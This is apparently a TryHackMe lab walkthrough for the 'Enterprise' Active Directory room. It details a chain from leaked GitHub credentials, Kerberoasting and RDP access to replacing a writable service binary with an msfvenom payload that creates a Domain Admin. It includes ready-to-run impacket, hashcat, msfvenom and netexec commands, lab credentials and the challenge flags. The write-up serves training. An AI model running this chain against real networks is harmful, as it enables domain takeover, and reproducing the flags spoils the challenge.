# 🏆 Walkthrough: Enterprise

## Room info
- Platform: TryHackMe
- Target: 10.130.175.2
- Room type: Active Directory / Windows Privilege Escalation
- Date solved: 2026-04-09
- Objectives: Capture User.txt and Root.txt on a Windows Server 2019 Domain Controller

## Objective status
- User.txt: DONE — THM{ed882d02b34246536ef7da79062bef36}
- Root.txt: DONE — THM{1a1fa94875421296331f145971ca4881}

## Exploitation chain
1. **Recon** — Nmap revealed DC at 10.130.175.2 with SMB, LDAP, RDP, WinRM, and Atlassian Bitbucket on port 7990
2. **GitHub OSINT** — Found org `Enterprise-THM` → user `Nik-enterprise-dev` → repo `mgmtScript.ps1` commit history leaked `nik:ToastyBoi!`
3. **Kerberoast** — Used nik creds to Kerberoast `bitbucket` (member of sensitive-account group) → cracked to `bitbucket:littleredbucket`
4. **User flag** — Read `bitbucket`'s Desktop via SMB (Users share)
5. **LDAP enum** — Found `contractor-temp:Password123!` in LDAP description field
6. **RDP + headless automation** — bitbucket is in Remote Desktop Users; used Xvfb + xfreerdp + xdotool to get interactive session without a GUI
7. **Service binary abuse** — `zerotieroneservice` binary at `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe` had `BUILTIN\Users:(OI)(CI)(W)`; bitbucket had explicit SERVICE_START/STOP rights in the service DACL
8. **SYSTEM shell** — Replaced binary with msfvenom exec payload; bat added domain user `hacker` to Domain Admins; wmiexec as hacker → read root.txt

## Key findings
- Services: DNS/53, IIS/80, SMB/445, LDAP/389, RDP/3389, WinRM/5985, Bitbucket/7990
- Interesting paths: `C:\Program Files (x86)\Zero Tier\Zero Tier One\` (writable by Users)
- Credentials: nik:ToastyBoi! · bitbucket:littleredbucket · contractor-temp:Password123! · hacker:Password123!
- Users: nik, bitbucket (Remote Desktop Users, SID-1106 service rights), contractor-temp, replication (DCSync rights), LAB-ADMIN
- Answers: User=THM{ed882d02b34246536ef7da79062bef36} · Root=THM{1a1fa94875421296331f145971ca4881}

## Commands worth keeping
```bash
# Kerberoast with valid creds
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.130.175.2 -request

# Crack Kerberos ticket
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

# Headless RDP with drive share
Xvfb :99 -screen 0 1024x768x24 &
DISPLAY=:99 xfreerdp /v:10.130.175.2 /u:bitbucket /p:littleredbucket \
  /cert:ignore /sec:nla /drive:rdpshare,/tmp/rdpshare /w:800 /h:600 &

# Interact with RDP session
DISPLAY=:99 xdotool key super+r         # Open Run dialog
DISPLAY=:99 xdotool type 'cmd.exe'      # Type command
DISPLAY=:99 xdotool key Return
DISPLAY=:99 import -window root screen.png  # Screenshot

# Check service DACL
sc sdshow zerotieroneservice

# Overwrite service binary (bypassing copy.exe ACL restrictions)
$b=[IO.File]::ReadAllBytes("C:\Windows\Temp\payload.exe")
[IO.File]::WriteAllBytes("C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe",$b)

# Generate exec payload
msfvenom -p windows/x64/exec CMD='cmd /c C:\Windows\Temp\add_admin.bat' -f exe -o payload.exe

# Start service and exec as SYSTEM
sc start zerotieroneservice

# Pwn3d! shell
netexec smb 10.130.175.2 -u hacker -p 'Password123!' -d LAB.ENTERPRISE.THM -x 'type C:\Users\Administrator\Desktop\root.txt'
```

## Loot
- nik:ToastyBoi! (GitHub commit history — plaintext creds in removed code)
- bitbucket:littleredbucket (Kerberoast — SPNs on service-like accounts)
- hacker:Password123! (created as domain admin via SYSTEM service abuse)

## Lessons learned
- Always check GitHub org history for the target company — devs accidentally commit and delete creds in history
- Service binary DACL and directory ACL are independent; `sc config` (ChangeConfig) can be denied while the binary file itself is writable
- Headless RDP via Xvfb + xfreerdp + xdotool is a reliable way to interact with an RDP-only account without a physical display; use `[IO.File]::WriteAllBytes` to write payloads when `copy.exe` is blocked by file-level ACL
